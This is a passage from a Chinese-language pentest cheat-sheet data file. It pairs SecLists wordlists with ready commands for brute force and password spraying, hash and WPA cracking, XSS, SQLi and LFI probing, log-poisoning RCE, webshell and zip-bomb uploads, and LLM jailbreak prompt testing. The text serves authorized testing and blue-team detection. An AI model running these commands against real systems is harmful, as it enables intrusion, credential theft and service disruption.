            {"key": "users", "path": "Usernames/top-usernames-shortlist.txt",
             "note": "配对的用户名清单"},
        ],
        "commands": [
            {"tool": "解压 rockyou", "shell": "bash",
             "cmd": "tar -xzf {rockyou} -C /tmp/ && wc -l /tmp/rockyou.txt",
             "note": "压缩包解压后约 133 MB；Windows 10+ 自带 tar 命令，Kali 同样可用"},
            {"tool": "hydra（SSH）", "shell": "bash",
             "cmd": "hydra -L {users} -P {top10k} -t 4 -f -o hydra-ssh.txt ssh://{host}",
             "note": "-t 4 控制并发（SSH 并发高容易被拒）；-f 找到一组就停"},
            {"tool": "hydra（RDP）", "shell": "bash",
             "cmd": "hydra -L {users} -P {top500} -t 1 -W 3 -f rdp://{host}",
             "note": "RDP 并发必须为 1，否则会话会互相踢掉"},
            {"tool": "hydra（Web 表单）", "shell": "bash",
             "cmd": "hydra -L {users} -P {top500} {host} http-post-form \"/login:username=^USER^&password=^PASS^:F=incorrect\" -t 10",
             "note": "F= 后面填「失败响应的特征字符串」，用浏览器抓包确认真实字段名"},
            {"tool": "nxc 喷洒（SMB）", "shell": "bash",
             "cmd": "nxc smb {host} -u {users} -p {top500} --continue-on-success --no-bruteforce",
             "note": "--no-bruteforce 是「按顺序一一配对」的喷洒模式，比全组合温和得多"},
            {"tool": "nxc 内网批量", "shell": "bash",
             "cmd": "nxc smb 10.0.0.0/24 -u {users} -p {top500} --continue-on-success --no-bruteforce --jitter 2",
             "note": "--jitter 2 随机延迟，降低被 EDR 发现概率"},
            {"tool": "离线破解", "shell": "bash",
             "cmd": "hashcat -m 1000 ntlm-hashes.txt {top10k} -O -w 3 --username",
             "note": "-m 1000 是 NTLM；离线破解无锁定风险，字典可以上大的"},
        ],
        "tips": [
            "顺序：先喷洒（Top500 × 已知用户）→ 再针对单账户爆破 → 最后离线破解哈希。",
            "在线爆破务必先确认锁定策略与告警阈值，生产环境建议锁定 ≤3 次/账户。",
            "拿到一个口令后要横向复用测试（口令复用率极高），但注意别越权。",
            "本界面「全库搜索」可以按年份/主题找口令字典，如搜 2025、wifi、chinese。",
        ],
    },
    {
        "id": "default-creds",
        "group": "creds",
        "title": "默认凭据与设备口令",
        "level": "入门",
        "summary": "针对路由器、打印机、摄像头、中间件管理台（Tomcat/WebLogic/Jenkins）、"
                   "数据库等「出厂默认口令」做一次全面尝试，成本极低但命中率可观。",
        "why": "SecLists 的 Default-Credentials 把「用户名:口令」直接写在一行（hydra 的 -C 格式），"
               "还有按协议分类的 betterdefaultpasslist（ssh/telnet/mssql/oracle/tomcat）。",
        "lists": [
            {"key": "creds", "path": "Passwords/Default-Credentials/default-passwords.txt",
             "note": "user:pass 一行一条，hydra -C 直接吃"},
            {"key": "credcsv", "path": "Passwords/Default-Credentials/default-passwords.csv",
             "note": "CSV 版本，含厂商与设备型号，可筛选后用"},
            {"key": "ssh", "path": "Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt",
             "note": "SSH 设备默认凭据"},
            {"key": "telnet", "path": "Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt",
             "note": "Telnet 设备默认凭据"},
            {"key": "mssql", "path": "Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt",
             "note": "MSSQL 默认 sa 口令"},
            {"key": "scada", "path": "Passwords/Default-Credentials/scada-pass.csv",
             "note": "工控/SCADA 设备默认口令（授权环境才可用）"},
        ],
        "commands": [
            {"tool": "hydra（组合凭据）", "shell": "bash",
             "cmd": "hydra -C {creds} -t 4 -f ssh://{host}",
             "note": "-C 表示文件里是 user:pass 组合，非常适合默认凭据"},
            {"tool": "hydra（HTTP Basic）", "shell": "bash",
             "cmd": "hydra -C {creds} -f {host} http-get /admin/",
             "note": "针对路由器/摄像头管理页的 Basic 认证"},
            {"tool": "nxc（SMB/WinRM 等）", "shell": "bash",
             "cmd": "awk -F: '{{print $1}}' {creds} | sort -u > def-users.txt && nxc smb {host} -u def-users.txt -p def-pass.txt --continue-on-success",
             "note": "先把组合文件拆成用户与口令两个清单"},
            {"tool": "Tomcat 管理台", "shell": "bash",
             "cmd": "hydra -C {creds} -f {host} http-get /manager/html",
             "note": "Tomcat manager 一旦进去可直接部署 WAR 拿 shell"},
            {"tool": "数据库", "shell": "bash",
             "cmd": "hydra -C {mssql} -f mssql://{host}  # 或使用 nxc mssql {host} -u sa -p <pass>",
             "note": "数据库默认口令优先试 sa/root/postgres"},
            {"tool": "CSV 转组合", "shell": "bash",
             "cmd": "tail -n +2 {credcsv} | awk -F, '{{print $2\":\"$3}}' | sort -u > creds-from-csv.txt",
             "note": "CSV 有表头，先 tail 跳过；列号需按文件实际内容调整"},
        ],
        "tips": [
            "默认凭据测试属于「低风险高收益」，资产清单里的每一台设备都值得试一遍。",
            "做资产测绘时把设备型号记上（如 Hikvision、Dahua），可以去对应厂商文档查默认口令。",
            "本界面可直接预览 default-passwords.csv，用「工具箱」按关键字过滤出某厂商的条目。",
        ],
    },
    {
        "id": "hash-crack",
        "group": "creds",
        "title": "哈希离线破解（john / hashcat）",
        "level": "进阶",
        "summary": "拿到哈希后离线破解：先字典、再字典+规则、最后掩码/混合攻击。"
                   "离线没有锁定与日志风险，可以放心上大字典。",
        "why": "字典攻击的收益取决于「字典质量 × 规则」。先 Top1 万，再加 best64 规则放大，"
               "最后才上 rockyou 这类千万级字典。",
        "lists": [
            {"key": "top10k", "path": "Passwords/Common-Credentials/10k-most-common.txt",
             "note": "第一轮字典"},
            {"key": "rockyou", "path": "Passwords/Leaked-Databases/rockyou.txt.tar.gz",
             "note": "第二轮大字典（需解压）"},
            {"key": "pwdb100k", "path": "Passwords/Common-Credentials/Pwdb_top-100000.txt",
             "note": "Pwdb Top10 万，质量优于 rockyou 的尾部"},
            {"key": "leet", "path": "Passwords/Permutations/1337speak.txt",
             "note": "leet 变形表，做规则/变形时参考"},
            {"key": "withcount", "path": "Passwords/Leaked-Databases/rockyou-withcount.txt.tar.gz",
             "note": "带出现次数的 rockyou，可按频次截取前 N 万条"},
        ],
        "commands": [
            {"tool": "john（字典）", "shell": "bash",
             "cmd": "john --wordlist={top10k} --format=raw-md5 hashes.txt",
             "note": "格式按实际哈希类型替换：raw-md5 / raw-sha1 / nt / bcrypt …"},
            {"tool": "john（字典+规则）", "shell": "bash",
             "cmd": "john --wordlist={top10k} --rules=best64 hashes.txt && john --show hashes.txt",
             "note": "best64/jumbo 规则能把 1 万条字典放大成百万级候选"},
            {"tool": "hashcat（字典）", "shell": "bash",
             "cmd": "hashcat -m 0 -a 0 hashes.txt {top10k} -O -w 3 -o cracked.txt --username",
             "note": "-m 0 是 MD5；-O 优化内核；-w 3 高负载"},
            {"tool": "hashcat（字典+规则）", "shell": "bash",
             "cmd": "hashcat -m 1000 -a 0 hashes.txt {top10k} -r /usr/share/hashcat/rules/best64.rule -O -w 3",
             "note": "-m 1000 是 NTLM，Windows 环境最常见"},
            {"tool": "hashcat（掩码）", "shell": "bash",
             "cmd": "hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d -O -w 3 --increment",
             "note": "口令符合固定模式时（如 Company@2025）掩码比字典快得多"},
            {"tool": "识别哈希类型", "shell": "bash",
             "cmd": "hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'   # 或 hashcat --identify hashes.txt",
             "note": "类型判错会白跑，先识别再开跑"},
        ],
        "tips": [
            "先看哈希来源（NTLM 用 -m 1000、NetNTLMv2 用 -m 5600、bcrypt 用 -m 3200）。",
            "有 GPU 时 hashcat 比 john 快得多；只有 CPU 时 john 的 --fork 与规则实现更省心。",
            "破解结果用 --show 或 john --show 汇总，避免重复劳动。",
            "结合目标信息造专属字典（公司名+年份+符号）比通用大字典有效得多。",
        ],
    },
    {
        "id": "wifi",
        "group": "creds",
        "title": "WiFi / WPA 握手包破解",
        "level": "进阶",
        "summary": "抓到 WPA/WPA2 握手包（或 PMKID）后，用 WiFi 专用概率字典离线尝试恢复 PSK。",
        "why": "WiFi 口令高度集中在「数字+常见词」的短组合，"
               "probable-v2-wpa 系列已按真实热点统计排序，几千条就能覆盖相当比例。",
        "lists": [
            {"key": "wpa62", "path": "Passwords/WiFi-WPA/probable-v2-wpa-top62.txt",
             "note": "Top62，先跑，几秒钟"},
            {"key": "wpa447", "path": "Passwords/WiFi-WPA/probable-v2-wpa-top447.txt",
             "note": "Top447"},
            {"key": "wpa4800", "path": "Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
             "note": "Top4800，主力字典"},
            {"key": "top1m", "path": "Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt",
             "note": "够了再上百万级；WPA 每秒钟只算几千次，字典越大越慢"},
        ],
        "commands": [
            {"tool": "aircrack-ng", "shell": "bash",
             "cmd": "aircrack-ng -w {wpa4800} -b <目标BSSID> capture-01.cap",
             "note": "需先抓到握手包（airodump-ng 抓，aireplay-ng 催）"},
            {"tool": "hashcat（22000）", "shell": "bash",
             "cmd": "hcxpcapngtool -o capture.hc22000 capture-01.cap && hashcat -m 22000 capture.hc22000 {wpa4800} -O -w 3",
             "note": "hashcat 的 22000 格式支持 GPU 加速，比 aircrack 快很多"},
            {"tool": "在线概率字典", "shell": "bash",
             "cmd": "curl -s 'https://wpa-sec.stanev.org/?api&dl=1' -o wpa-sec-probable.txt",
             "note": "社区概率字典（需网络）；本仓库的 probable 系列即同源思路"},
        ],
        "tips": [
            "只有授权范围内的热点才能测试；干扰他人 WiFi 属于违法行为。",
            "PMKID 攻击不需要等待客户端重连，成功率更高（hcxdumptool）。",
            "WPA3/SAE 与 WPA2-Enterprise 不适用本流程。",
        ],
    },
    # ================================================== 注入与载荷
    {
        "id": "xss",
        "group": "payload",
        "title": "XSS 载荷与反射点探测",
        "level": "进阶",
        "summary": "用 XSS 载荷字典批量探测参数/表单的反射与过滤情况，先找出「哪些点有反应」，"
                   "再针对上下文精调 payload。",
        "why": "Fuzzing/XSS 按「上下文」与「来源」分目录："
               "human-friendly 是人工整理可读清单，Polyglots 是跨上下文通用载荷。",
        "lists": [
            {"key": "jhaddix", "path": "Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
             "note": "Jason Haddix 整理，覆盖面广，首选"},
            {"key": "context", "path": "Fuzzing/XSS/human-friendly/XSS-With-Context-Jhaddix.txt",
             "note": "标注了每种载荷适用的 HTML 上下文（属性内/脚本内/URL）"},
            {"key": "polyglot", "path": "Fuzzing/XSS/Polyglots/XSS-Polyglots.txt",
             "note": "多态载荷：一份能适配多种上下文，适合盲测"},
            {"key": "brutelogic", "path": "Fuzzing/XSS/human-friendly/XSS-Bypass-Strings-BruteLogic.txt",
             "note": "WAF 绕过字符串"},
            {"key": "payloadbox", "path": "Fuzzing/XSS/human-friendly/XSS-payloadbox.txt",
             "note": "payloadbox 合集，含大量新式标签与事件"},
            {"key": "portswigger", "path": "Fuzzing/XSS/human-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
             "note": "PortSwigger 速查表，含原理说明"},
        ],
        "commands": [
            {"tool": "ffuf（反射探测）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/search?q=FUZZ\" -w {polyglot} -mc all -mr '<script|<img|<svg' -t 20 -o ffuf-xss.json -of json",
             "note": "-mr 匹配「响应里出现了未编码的标签」，说明反射且未转义"},
            {"tool": "ffuf（HTTP 参数）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/page?FUZZ=<svg/onload=alert(1)>\" -w {params} -mc all -fs 0 -t 20",
             "note": "换一种思路：参数名 fuzz + 固定 payload；params 用 burp-parameter-names.txt"},
            {"tool": "dalfox", "shell": "bash",
             "cmd": "dalfox file urls.txt --custom-payload {jhaddix} --mining-dom --worker 10 -o dalfox.txt",
             "note": "自动化 XSS 扫描器，直接报告可利用的点"},
            {"tool": "xsstrike", "shell": "bash",
             "cmd": "python3 xsstrike.py -u \"{url}/search?q=test\" --fuzzer",
             "note": "自带上下文分析与 WAF 检测"},
            {"tool": "POST 表单", "shell": "bash",
             "cmd": "ffuf -u {url}/comment -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=FUZZ' -w {jhaddix} -mc all -mr '<script' -t 15",
             "note": "留言/评论类接口的经典存储型 XSS 探测"},
        ],
        "tips": [
            "探测到未转义反射后，用浏览器手工确认执行（alert/print），别只信扫描器结论。",
            "留意上下文：属性内需要闭合引号、JS 字符串内需要闭合引号加注释，payload 字典里有对应条目。",
            "CSP 会拦住大部分弹窗，看到 CSP 响应头先用 PortSwigger 的绕过清单评估。",
            "存储型 XSS 需要第二次访问触发，用无痕窗口或受害者视角验证。",
        ],
    },
    {
        "id": "sqli",
        "group": "payload",
        "title": "SQL 注入载荷与登录绕过",
        "level": "进阶",
        "summary": "用 SQLi 载荷字典做批量探测（含认证绕过类），再交给 sqlmap 做深入利用。",
        "why": "Fuzzing/Databases/SQLi 既有通用报错/盲注载荷，也有按数据库类型（MySQL/MSSQL/Oracle/NoSQL）"
               "和 sqlmap risk 等级分类的清单；sqli.auth.bypass.txt 专攻登录框。",
        "lists": [
            {"key": "quick", "path": "Fuzzing/Databases/SQLi/quick-SQLi.txt",
             "note": "短清单，快速判断是否存在注入"},
            {"key": "generic", "path": "Fuzzing/Databases/SQLi/Generic-SQLi.txt",
             "note": "通用 SQLi 载荷合集"},
            {"key": "blind", "path": "Fuzzing/Databases/SQLi/Generic-BlindSQLi.fuzzdb.txt",
             "note": "盲注载荷"},
            {"key": "bypass", "path": "Fuzzing/Databases/SQLi/sqli.auth.bypass.txt",
             "note": "登录绕过专用载荷"},
            {"key": "mysql", "path": "Fuzzing/Databases/SQLi/MySQL.fuzzdb.txt",
             "note": "MySQL 专用：报错注入、读写文件、information_schema 枚举"},
            {"key": "polyglot", "path": "Fuzzing/Databases/SQLi/SQLi-Polyglots.txt",
             "note": "多态载荷，适配多种数据库"},
        ],
        "commands": [
            {"tool": "sqlmap（URL）", "shell": "bash",
             "cmd": "sqlmap -u \"{url}/item?id=1\" --batch --level 3 --risk 2 --random-agent --dbs",
             "note": "--dbs 先列库；确认注入后再 --dump 具体表"},
            {"tool": "sqlmap（Burp 请求）", "shell": "bash",
             "cmd": "sqlmap -r request.txt -p id --batch --level 5 --risk 3 --tamper=space2comment --dbs",
             "note": "从 Burp 保存的原始请求出发最准确（含 Cookie/Header）"},
            {"tool": "ffuf（报错探测）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/item?id=FUZZ\" -w {quick} -mc all -mr 'SQL syntax|mysql_fetch|ORA-|ODBC|PostgreSQL' -t 15",
             "note": "匹配数据库报错关键字，命中即代表有注入迹象"},
            {"tool": "ffuf（登录绕过）", "shell": "bash",
             "cmd": "ffuf -u {url}/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -w {bypass} -mc all -fr 'Invalid|incorrect' -t 10",
             "note": "注意：成功后可能直接登录进后台，仅在授权环境使用"},
            {"tool": "nuclei", "shell": "bash",
             "cmd": "nuclei -u {url} -tags sqli -o nuclei-sqli.txt",
             "note": "模板化的快速筛查"},
        ],
        "tips": [
            "先手工加单引号看报错与响应差异，比盲目跑字典更快定位。",
            "WAF 在时考虑 --tamper（space2comment、charencode 等）并降低并发。",
            "sqlmap 的 --os-shell / --file-read 影响面大，务必确认授权范围。",
            "时间盲注注意 --time-sec 与网络抖动，误报常有。",
        ],
    },
    {
        "id": "lfi",
        "group": "payload",
        "title": "文件包含 / 目录穿越（LFI）",
        "level": "进阶",
        "summary": "针对 file=、page=、template=、download= 这类参数的路径穿越与文件读取测试，"
                   "目标是读到 /etc/passwd、web.config、私钥、日志等敏感文件。",
        "why": "LFI 载荷字典包含各种穿越深度、编码变形（%2e%2e、..%2f）、"
               "PHP 包装器（php://filter）与 null byte 等历史技巧。",
        "lists": [
            {"key": "jhaddix", "path": "Fuzzing/LFI/LFI-Jhaddix.txt",
             "note": "覆盖面最广的 LFI 清单，首选"},
            {"key": "crowd", "path": "Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt",
             "note": "按 Linux / Windows 分开的敏感文件路径"},
            {"key": "huge", "path": "Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt",
             "note": "超大量穿越变体，慢但全"},
            {"key": "dotfiles", "path": "Discovery/Web-Content/UnixDotfiles.fuzz.txt",
             "note": "配合 LFI 读点文件"},
        ],
        "commands": [
            {"tool": "ffuf（命中 /etc/passwd）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/index.php?file=FUZZ\" -w {jhaddix} -mc all -mr 'root:.*:0:0:' -t 20 -o ffuf-lfi.json -of json",
             "note": "匹配 passwd 文件特征串，命中即可确认文件读取"},
            {"tool": "ffuf（Windows 目标）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/download?f=FUZZ\" -w {crowd} -mc all -mr '\\[fonts\\]|\\[extensions\\]' -t 20",
             "note": "匹配 win.ini / boot.ini 之类文件名段落头"},
            {"tool": "PHP 包装器", "shell": "bash",
             "cmd": "curl -sk \"{url}/index.php?file=php://filter/convert.base64-encode/resource=index.php\" | tail -c +1 | base64 -d",
             "note": "直接读源码；比穿越稳定，一旦可用就能审计源码找更多漏洞"},
            {"tool": "日志投毒 → RCE", "shell": "bash",
             "cmd": "curl -sk {url}/ -A '<?php system($_GET[c]); ?>' && curl -sk \"{url}/index.php?file=/var/log/apache2/access.log&c=id\"",
             "note": "把 PHP 代码写进 UA，再包含日志文件执行（需日志可读且可解析）"},
            {"tool": "nuclei", "shell": "bash",
             "cmd": "nuclei -u {url} -tags lfi -o nuclei-lfi.txt",
             "note": "模板扫描快速筛查"},
        ],
        "tips": [
            "先确认参数确实在读文件（比如传个不存在的路径看报错），再上大字典。",
            "穿越深度不够就加 ../，注意 URL 编码与服务器规范化差异。",
            "php://filter 一旦可用，优先读 config、db.php、.env，比盲猜文件更值。",
            "读到 /etc/shadow 也别急着破解，先看是否有可复用的密钥或连接串。",
        ],
    },
    {
        "id": "cmdi-ssti",
        "group": "payload",
        "title": "命令注入 / SSTI / XXE / 其他注入载荷",
        "level": "高级",
        "summary": "命令注入、模板注入（SSTI）、XXE、SSI、格式化字符串、LDAP 等各类注入的载荷字典，"
                   "以及「大而全」的恶意字符串清单。",
        "why": "Fuzzing 顶层把这些载荷按技术分类放好，省去自己攒 payload 的时间；"
               "big-list-of-naughty-strings 用于输入校验健壮性测试。",
        "lists": [
            {"key": "cmdi", "path": "Fuzzing/command-injection-commix.txt",
             "note": "commix 的命令注入载荷"},
            {"key": "ssti", "path": "Fuzzing/template-engines-expression.txt",
             "note": "模板引擎表达式（Jinja2/Twig/Freemarker…）"},
            {"key": "sstivars", "path": "Fuzzing/template-engines-special-vars.txt",
             "note": "模板引擎特殊变量"},
            {"key": "xxe", "path": "Fuzzing/XXE-Fuzzing.txt",
             "note": "XXE 外部实体载荷"},
            {"key": "ssi", "path": "Fuzzing/SSI-Injection-Jhaddix.txt",
             "note": "SSI 注入"},
            {"key": "format", "path": "Fuzzing/FormatString-Jhaddix.txt",
             "note": "格式化字符串"},
            {"key": "naughty", "path": "Fuzzing/big-list-of-naughty-strings.txt",
             "note": "输入健壮性测试大清单"},
            {"key": "unix", "path": "Fuzzing/UnixAttacks.fuzzdb.txt",
             "note": "fuzzdb 的 Unix 攻击串合集"},
        ],
        "commands": [
            {"tool": "commix", "shell": "bash",
             "cmd": "commix -u \"{url}/ping?ip=127.0.0.1\" --batch --random-agent",
             "note": "专攻命令注入的自动化工具"},
            {"tool": "ffuf（时间盲注）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/ping?ip=FUZZ\" -w {cmdi} -mc all -mr 'uid=|gid=|www-data' -t 10",
             "note": "匹配命令回显特征；无回显时改用 sleep 载荷＋响应时间判断"},
            {"tool": "SSTI 快速判定", "shell": "bash",
             "cmd": "curl -sk \"{url}/render?name={{7*7}}\" | grep -o '49' | head -1",
             "note": "返回 49 说明模板被求值；再按引擎选 RCE 链"},
            {"tool": "SSTI 字典批量", "shell": "bash",
             "cmd": "ffuf -u \"{url}/render?name=FUZZ\" -w {ssti} -mc all -mr '49|7777777' -t 15",
             "note": "字典里含各类引擎的算式与对象链探测载荷"},
            {"tool": "XXE（带外）", "shell": "bash",
             "cmd": "curl -sk {url}/api/xml -H 'Content-Type: application/xml' --data-binary @xxe-payload.xml",
             "note": "把 {xxe} 中的载荷写入 xxe-payload.xml；带外需自建 HTTP/FTP 监听"},
        ],
        "tips": [
            "命令注入优先用「时间盲注」判断（;sleep 5），回显不一定存在。",
            "SSTI 要判别引擎：{{7*7}} 是 Jinja/Twig，${7*7} 是 Freemarker，#{7*7} 是 Ruby。",
            "XXE 在现代库中多被禁用外部实体，改试 SVG/DOCX/XLSX 等文件上传入口。",
            "big-list-of-naughty-strings 更适合测试「解析是否崩溃」而不是直接拿漏洞。",
        ],
    },
    {
        "id": "id-enum",
        "group": "payload",
        "title": "数字枚举：验证码 / 优惠券 / ID 遍历",
        "level": "进阶",
        "summary": "对 4 位验证码、6 位编号、订单号等可枚举空间做遍历，"
                   "常配合限速与多线程，找「可被暴力猜中」的业务逻辑漏洞。",
        "why": "Fuzzing 下按位数预生成了完整数字清单（0000-9999、000000-999999），"
               "直接喂给 ffuf 就行，省得自己写生成脚本。",
        "lists": [
            {"key": "pin4", "path": "Fuzzing/4-digits-0000-9999.txt",
             "note": "0000~9999 全量"},
            {"key": "pin6", "path": "Fuzzing/6-digits-000000-999999.txt",
             "note": "100 万条，注意耗时（配合 -rate 与随机化）"},
            {"key": "pin3", "path": "Fuzzing/3-digits-000-999.txt",
             "note": "000~999"},
            {"key": "amounts", "path": "Fuzzing/Amounts/all.txt",
             "note": "金额/数量类边界值（0、-1、极大值…），测支付逻辑"},
            {"key": "dates", "path": "Fuzzing/Dates/2025/2025-MM-DD.txt",
             "note": "日期格式枚举，测日期参数校验"},
        ],
        "commands": [
            {"tool": "ffuf（验证码）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/verify?code=FUZZ\" -w {pin4} -mc all -fs <失败响应长度> -rate 30 -t 5 -o ffuf-pin.json -of json",
             "note": "务必限制速率；真实业务系统需要先确认「是否有尝试次数限制」"},
            {"tool": "ffuf（ID 遍历）", "shell": "bash",
             "cmd": "ffuf -u \"{url}/api/orders/FUZZ\" -w {pin4} -mc 200 -t 20 -rate 50 -H 'Authorization: Bearer <token>'",
             "note": "越权测试：用低权限 token 访问他人 ID"},
            {"tool": "ffuf（带填充的编号）", "shell": "bash",
             "cmd": "seq -f '%06g' 100000 100100 > ids.txt && ffuf -u \"{url}/invoice/FUZZ.pdf\" -w ids.txt -mc 200 -t 10",
             "note": "按目标实际编号规则生成，避免全量 100 万条"},
            {"tool": "随机化顺序", "shell": "bash",
             "cmd": "shuf {pin4} > pins-shuffled.txt && ffuf -u \"{url}/verify?code=FUZZ\" -w pins-shuffled.txt -mc all -fs <基线> -rate 20",
             "note": "顺序枚举容易被风控识别，打乱顺序并限速更像正常用户"},
        ],
        "tips": [
            "这类测试最容易触发风控与封号，先看响应头是否有 X-RateLimit 之类的提示。",
            "业务系统通常允许 3~5 次错误，真正的漏洞是「没有次数限制」或「可并发绕过」。",
            "金额/数量类边界值（负数、0、超精度小数）常能造成逻辑漏洞，值得单独测。",
        ],
    },
    # ================================================== 特殊场景
    {
        "id": "upload-payloads",
        "group": "special",
        "title": "文件上传测试：Zip 炸弹 / 畸形文件名 / EICAR",
        "level": "高级",
        "summary": "验证上传功能与杀毒/解压逻辑是否健壮："
                   "Zip 炸弹（解压放大）、Zip 路径穿越、超长/空字节文件名、EICAR 测试文件。",
        "why": "Payloads 目录提供的是「真实文件样本」而不是文本字典，上传这些文件能直接检验后端的解压与杀毒处理。",
        "lists": [
            {"key": "zbsm", "path": "Payloads/Zip-Bombs/zbsm.zip",
             "note": "小号 Zip 炸弹（安全测试起点）"},
            {"key": "zbomb", "path": "Payloads/Zip-Bombs/zip-bomb.zip",
             "note": "经典 42.zip 变体，注意解压会吃满磁盘/CPU"},
            {"key": "trav", "path": "Payloads/Zip-Traversal/depth-00.zip",
             "note": "Zip 路径穿越样本"},
            {"key": "nullbyte", "path": "Payloads/File-Names/null-byte/Hello.php%00World.txt",
             "note": "空字节文件名样本"},
            {"key": "maxlen", "path": "Payloads/File-Names/max-length.zip",
             "note": "超长文件名样本"},
            {"key": "eicar", "path": "Payloads/Anti-Virus/eicar-com.txt",
             "note": "EICAR 反病毒测试文件（无危害，仅用于验证杀毒是否生效）"},
        ],
        "commands": [
            {"tool": "curl 上传（EICAR）", "shell": "bash",
             "cmd": "curl -sk -F \"file=@{eicar}\" -b cookies.txt {url}/upload -o upload-resp.html",
             "note": "若返回「病毒检测」说明杀毒链路生效；若无反应则可能存在缺口"},
            {"tool": "curl 上传（Zip 炸弹）", "shell": "bash",
             "cmd": "curl -sk -F \"file=@{zbsm}\" -b cookies.txt {url}/upload/zip",
             "note": "⚠️ 只在授权且可丢弃的测试环境使用，可能直接拖垮后端"},
            {"tool": "curl 上传（穿越包）", "shell": "bash",
             "cmd": "curl -sk -F \"file=@{trav}\" -b cookies.txt {url}/upload/zip",
             "note": "若解压到 Web 目录，可能直接写入可访问的文件"},
            {"tool": "文件名注入", "shell": "bash",
             "cmd": "curl -sk -F 'file=@shell.php;filename=\"shell.php%00.jpg\"' -b cookies.txt {url}/upload",
             "note": "测试空字节/双扩展名/大小写绕过等命名校验"},
            {"tool": "上传 WebShell", "shell": "bash",
             "cmd": "curl -sk -F \"file=@Web-Shells/FuzzDB/cmd.php\" -b cookies.txt {url}/upload/file",
             "note": "⚠️ 仅在授权测试中使用；成功后访问返回的路径"},
        ],
        "tips": [
            "上传测试属于高风险操作：确认环境可丢弃、有回滚手段，且已获书面授权。",
            "Zip 炸弹很容易压垮共享测试环境，先问清楚能否做。",
            "更常见的是「扩展名/内容类型绕过」：试 .phtml、.php5、.pHp、内容头伪造 image/jpeg。",
            "EICAR 文件本身无危害，是行业标准的杀毒链验证样本。",
        ],
    },
    {
        "id": "webshell",
        "group": "special",
        "title": "WebShell 样本（利用与检测）",
        "level": "高级",
        "summary": "仓库收录了 PHP / JSP / ASPX 等 WebShell，"
                   "用途是授权渗透中的「上传即用」，以及蓝队做检测规则与查杀验证。",
        "why": "按语言与技术栈分目录（PHP、JSP、WordPress、Magento、laudanum 等），"
               "laudanum 是经典渗透测试 Shell 合集。",
        "lists": [
            {"key": "php", "path": "Web-Shells/PHP/Dysco.php",
             "note": "功能较全的 PHP Shell，界面友好"},
            {"key": "jsp", "path": "Web-Shells/JSP/simple-shell.jsp",
             "note": "JSP 简易 Shell，Tomcat 环境常用"},
            {"key": "fuzzdb", "path": "Web-Shells/FuzzDB/cmd.php",
             "note": "fuzzdb 单命令执行脚本"},
            {"key": "wp", "path": "Web-Shells/WordPress/",
             "note": "WordPress 主题/插件形态的 Shell"},
            {"key": "laudanum", "path": "Web-Shells/laudanum-1.0/",
             "note": "laudanum 合集（多语言）"},
        ],
        "commands": [
            {"tool": "上传并访问", "shell": "bash",
             "cmd": "curl -sk -F \"file=@{php}\" {url}/upload && curl -sk {url}/uploads/Dysco.php?cmd=id",
             "note": "⚠️ 授权环境专用；常规写法是 ?cmd= 或 POST 参数传命令"},
            {"tool": "WordPress 场景", "shell": "bash",
             "cmd": "wpscan --url {url} --api-token <token> -e vp,vt,u",
             "note": "先找漏洞插件/主题，再考虑上传 Shell"},
            {"tool": "JSP 场景", "shell": "bash",
             "cmd": "curl -sk -b cookies.txt -F \"file=@{jsp}\" {url}/manager/deploy?path=/shell",
             "note": "Tomcat manager 部署 WAR 是经典路径"},
            {"tool": "检测视角（蓝队）", "shell": "bash",
             "cmd": "grep -rInE 'eval\\(|base64_decode\\(|system\\(|shell_exec\\(' /var/www/html --include='*.php' | head -50",
             "note": "把仓库样本当「已知恶意特征」做查杀规则验证"},
            {"tool": "YARA 扫描", "shell": "bash",
             "cmd": "yara -r webshell-rules.yar /var/www/html",
             "note": "用仓库样本生成/校验 YARA 规则"},
        ],
        "tips": [
            "本目录样本同样会被杀毒软件标记，测试机需加入白名单——别在生产机上解压仓库。",
            "合法用途主要有两类：已授权的渗透测试、蓝队检测能力验证。",
            "别把这些文件放在公网可访问目录，会被搜索引擎与扫描器光顾。",
        ],
    },
    {
        "id": "ai-llm",
        "group": "special",
        "title": "AI / LLM 应用安全测试",
        "level": "进阶",
        "summary": "评估大模型应用的越狱防护、偏见、训练数据/个人信息泄露、记忆召回等，"
                   "用现成提示词清单批量测试自家模型或对外服务（需授权）。",
        "why": "Ai/LLM_Testing 按测试目标分目录：Bias_Testing（偏见）、Data_Leakage（数据泄露）、"
               "Divergence_attack（越狱/对齐逃逸）、Ethical_and_Safety_Boundaries（安全边界）、"
               "Memory_Recall_Testing（会话记忆）。",
        "lists": [
            {"key": "jailbreak", "path": "Ai/LLM_Testing/Ethical_and_Safety_Boundaries/jailbreak_prompts_2023_12_25.csv",
             "note": "越狱提示词合集（CSV）"},
            {"key": "bias", "path": "Ai/LLM_Testing/Bias_Testing/gender_bias.txt",
             "note": "性别偏见测试提示词"},
            {"key": "leak", "path": "Ai/LLM_Testing/Data_Leakage/personal_data.txt",
             "note": "个人信息泄露测试"},
            {"key": "pretrain", "path": "Ai/LLM_Testing/Divergence_attack/pre-training_data.txt",
             "note": "训练数据探测"},
            {"key": "memory", "path": "Ai/LLM_Testing/Memory_Recall_Testing/session_recall.txt",
             "note": "跨会话记忆召回测试"},
        ],
        "commands": [
            {"tool": "批量发提示词", "shell": "bash",
